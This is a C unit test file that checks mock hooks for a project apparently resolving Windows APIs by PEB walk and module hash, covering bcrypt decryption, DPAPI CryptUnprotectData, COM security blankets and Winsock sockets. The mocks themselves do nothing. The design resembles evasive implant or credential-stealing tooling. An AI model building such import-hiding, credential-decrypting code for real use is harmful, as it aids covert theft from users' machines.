/*
 * test_mock_seams.c -- Verify all PEB mock install hooks work
 *
 * Tests: bcrypt, crypt32, com, ws2, peb mock module override
 * Build: gcc -Wall -Wextra -O2 -Iinclude -std=c11 -DZIALFI_TEST_MODE \
 *        -o tests/test_mock_seams tests/test_mock_seams.c \
 *        src/crypto/bcrypt_peb.c src/crypto/crypt32_peb.c src/crypto/com_peb.c \
 *        src/network/ws2_peb.c src/types/peb.c src/types/hash.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <winsock2.h>
#include <windows.h>
#include "bcrypt_peb.h"
#include <wincrypt.h>
#include "crypt32_peb.h"
#include "com_peb.h"
#include "ws2_peb.h"
#include "peb.h"

#define TEST(name) do { printf("  PASS: %s\n", name); passed++; } while(0)
#define FAIL(name, msg) do { printf("  FAIL: %s -- %s\n", name, msg); failed++; } while(0)

/* Mock bcrypt stubs */
static NTSTATUS WINAPI mock_bcrypt_open(BCRYPT_ALG_HANDLE *a, LPCWSTR b, LPCWSTR c, ULONG d) { (void)a;(void)b;(void)c;(void)d; return 0; }
static NTSTATUS WINAPI mock_bcrypt_close(BCRYPT_ALG_HANDLE a, ULONG b) { (void)a;(void)b; return 0; }
static NTSTATUS WINAPI mock_bcrypt_setprop(BCRYPT_ALG_HANDLE a, LPCWSTR b, PUCHAR c, ULONG d, ULONG e) { (void)a;(void)b;(void)c;(void)d;(void)e; return 0; }
static NTSTATUS WINAPI mock_bcrypt_genkey(BCRYPT_ALG_HANDLE a, BCRYPT_KEY_HANDLE *b, PUCHAR c, ULONG d, PUCHAR e, ULONG f, ULONG g) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g; return 0; }
static NTSTATUS WINAPI mock_bcrypt_derive(BCRYPT_ALG_HANDLE a, PUCHAR b, ULONG c, PUCHAR d, ULONG e, ULONGLONG f, PUCHAR g, ULONG h, ULONG i) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i; return 0; }
static NTSTATUS WINAPI mock_bcrypt_decrypt(BCRYPT_KEY_HANDLE a, PUCHAR b, ULONG c, PVOID d, PUCHAR e, ULONG f, PUCHAR g, ULONG h, ULONG *i, ULONG j) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j; return 0; }
static NTSTATUS WINAPI mock_bcrypt_destroykey(BCRYPT_KEY_HANDLE a) { (void)a; return 0; }
static NTSTATUS WINAPI mock_bcrypt_createhash(BCRYPT_ALG_HANDLE a, BCRYPT_HASH_HANDLE *b, PUCHAR c, ULONG d, PUCHAR e, ULONG f, ULONG g) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g; return 0; }
static NTSTATUS WINAPI mock_bcrypt_hashdata(BCRYPT_HASH_HANDLE a, PUCHAR b, ULONG c, ULONG d) { (void)a;(void)b;(void)c;(void)d; return 0; }
static NTSTATUS WINAPI mock_bcrypt_finishhash(BCRYPT_HASH_HANDLE a, PUCHAR b, ULONG c, ULONG d) { (void)a;(void)b;(void)c;(void)d; return 0; }
static NTSTATUS WINAPI mock_bcrypt_destroyhash(BCRYPT_HASH_HANDLE a) { (void)a; return 0; }
static NTSTATUS WINAPI mock_bcrypt_genrandom(BCRYPT_ALG_HANDLE a, PUCHAR b, ULONG c, ULONG d) { (void)a;(void)b;(void)c;(void)d; return 0; }

/* Mock crypt32 */
static BOOL WINAPI mock_crypt_unprotect(DATA_BLOB *a, LPWSTR *b, DATA_BLOB *c, PVOID d, void *e, DWORD f, DATA_BLOB *g) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g; return TRUE; }

/* Mock COM */
static HRESULT WINAPI mock_coinit(LPVOID a, DWORD b) { (void)a;(void)b; return 0; }
static HRESULT WINAPI mock_cocreate(REFCLSID a, LPVOID b, DWORD c, REFIID d, LPVOID *e) { (void)a;(void)b;(void)c;(void)d;(void)e; return 0; }
static HRESULT WINAPI mock_coblanket(IUnknown *a, DWORD b, DWORD c, OLECHAR *d, DWORD e, DWORD f, RPC_AUTH_IDENTITY_HANDLE g, DWORD h) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h; return 0; }
static void WINAPI mock_couninit(void) { }

/* Mock ws2 */
static int WSAAPI mock_startup(WORD a, LPWSADATA b) { (void)a;(void)b; return 0; }
static int WSAAPI mock_cleanup(void) { return 0; }
static SOCKET WSAAPI mock_wsocket(int a, int b, int c, LPWSAPROTOCOL_INFOW d, GROUP e, DWORD f) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; return 1; }
static int WSAAPI mock_wconnect(SOCKET a, const struct sockaddr *b, int c) { (void)a;(void)b;(void)c; return 0; }
static int WSAAPI mock_wsend(SOCKET a, const char *b, int c, int d) { (void)a;(void)b;(void)c;(void)d; return c; }
static int WSAAPI mock_wrecv(SOCKET a, char *b, int c, int d) { (void)a;(void)b;(void)c;(void)d; return 0; }
static int WSAAPI mock_wclose(SOCKET a) { (void)a; return 0; }
static int WSAAPI mock_wbind(SOCKET a, const struct sockaddr *b, int c) { (void)a;(void)b;(void)c; return 0; }
static int WSAAPI mock_wlisten(SOCKET a, int b) { (void)a;(void)b; return 0; }
static SOCKET WSAAPI mock_waccept(SOCKET a, struct sockaddr *b, int *c) { (void)a;(void)b;(void)c; return 1; }
static int WSAAPI mock_wsetsockopt(SOCKET a, int b, int c, const char *d, int e) { (void)a;(void)b;(void)c;(void)d;(void)e; return 0; }
static int WSAAPI mock_wgetsockname(SOCKET a, struct sockaddr *b, int *c) { (void)a;(void)b;(void)c; return 0; }
static u_short WSAAPI mock_whtons(u_short a) { return a; }
static u_long WSAAPI mock_whtonl(u_long a) { return a; }
static u_short WSAAPI mock_wntohs(u_short a) { return a; }

/* Stub for NASM getPeb — tests never call the real PEB walk */
void *getPeb(void) { return NULL; }

int main(void) {
    int passed = 0, failed = 0;
    printf("=== test_mock_seams: PEB mock install hooks ===\n");

    /* Test 1: bcrypt mock */
    {
        bcrypt_api_t mock = {0};
        mock.pOpen = mock_bcrypt_open; mock.pClose = mock_bcrypt_close;
        mock.pSetProp = mock_bcrypt_setprop; mock.pGenKey = mock_bcrypt_genkey;
        mock.pDerive = mock_bcrypt_derive; mock.pDecrypt = mock_bcrypt_decrypt;
        mock.pDestroyKey = mock_bcrypt_destroykey; mock.pCreateHash = mock_bcrypt_createhash;
        mock.pHashData = mock_bcrypt_hashdata; mock.pFinishHash = mock_bcrypt_finishhash;
        mock.pDestroyHash = mock_bcrypt_destroyhash; mock.pGenRandom = mock_bcrypt_genrandom;
        mirage_bcrypt_api_install(&mock);
        const bcrypt_api_t *api = mirage_bcrypt_api();
        if (api && api->ready && api->pOpen == mock_bcrypt_open) TEST("bcrypt mock install");
        else FAIL("bcrypt mock install", "api not ready or pointers wrong");
    }

    /* Test 2: crypt32 mock */
    {
        crypt32_api_t mock = {0};
        mock.pUnprotect = mock_crypt_unprotect;
        mirage_crypt32_api_install(&mock);
        const crypt32_api_t *api = mirage_crypt32_api();
        if (api && api->ready && api->pUnprotect == mock_crypt_unprotect) TEST("crypt32 mock install");
        else FAIL("crypt32 mock install", "api not ready");
    }

    /* Test 3: com mock */
    {
        com_api_t mock = {0};
        mock.pInit = mock_coinit; mock.pCreate = mock_cocreate;
        mock.pBlanket = mock_coblanket; mock.pUninit = mock_couninit;
        mirage_com_api_install(&mock);
        const com_api_t *api = mirage_com_api();
        if (api && api->ready && api->pBlanket == mock_coblanket) TEST("com mock install");
        else FAIL("com mock install", "api not ready");
    }

    /* Test 4: ws2 mock */
    {
        ws2_api_t mock = {0};
        mock.pStartup = mock_startup; mock.pCleanup = mock_cleanup;
        mock.pWSASocketW = mock_wsocket; mock.pconnect = mock_wconnect;
        mock.psend = mock_wsend; mock.precv = mock_wrecv;
        mock.pclosesocket = mock_wclose; mock.pbind = mock_wbind;
        mock.plisten = mock_wlisten; mock.paccept = mock_waccept;
        mock.psetsockopt = mock_wsetsockopt; mock.pgetsockname = mock_wgetsockname;
        mock.phtons = mock_whtons; mock.phtonl = mock_whtonl; mock.pntohs = mock_wntohs;
        mirage_ws2_api_install(&mock);
        const ws2_api_t *api = mirage_ws2_api();
        if (api && api->ready && api->psend == mock_wsend) TEST("ws2 mock install");
        else FAIL("ws2 mock install", "api not ready");
    }

    /* Test 5: peb mock module resolve */
    {
        mirage_peb_mock_clear();
        int fake = 42;
        mirage_peb_mock_module(0xDEADBEEF, &fake);
        void *result = mirage_get_module_by_hash(0xDEADBEEF);
        if (result == &fake) TEST("peb mock module resolve");
        else FAIL("peb mock module resolve", "wrong pointer");
    }

    /* Test 6: peb mock clear */
    {
        mirage_peb_mock_clear();
        void *result = mirage_get_module_by_hash(0xDEADBEEF);
        if (result == NULL) TEST("peb mock clear");
        else FAIL("peb mock clear", "still resolvable");
    }

    /* Test 7: peb mock multiple modules */
    {
        mirage_peb_mock_clear();
        int a=1, b=2, c=3;
        mirage_peb_mock_module(0x11111111, &a);
        mirage_peb_mock_module(0x22222222, &b);
        mirage_peb_mock_module(0x33333333, &c);
        if (mirage_get_module_by_hash(0x11111111)==&a &&
            mirage_get_module_by_hash(0x22222222)==&b &&
            mirage_get_module_by_hash(0x33333333)==&c) TEST("peb mock multiple modules");
        else FAIL("peb mock multiple modules", "wrong resolve");
        mirage_peb_mock_clear();
    }

    /* Test 8: peb mock overflow guard */
    {
        mirage_peb_mock_clear();
        int dummy = 0;
        for (int i = 0; i < 40; i++) mirage_peb_mock_module((uint32_t)i, &dummy);
        void *result = mirage_get_module_by_hash(0);
        if (result == &dummy) TEST("peb mock overflow guard");
        else FAIL("peb mock overflow guard", "first not found");
        mirage_peb_mock_clear();
    }

    printf("=== test_mock_seams: %d/%d PASSED ===\n", passed, passed + failed);
    return failed ? 1 : 0;
}
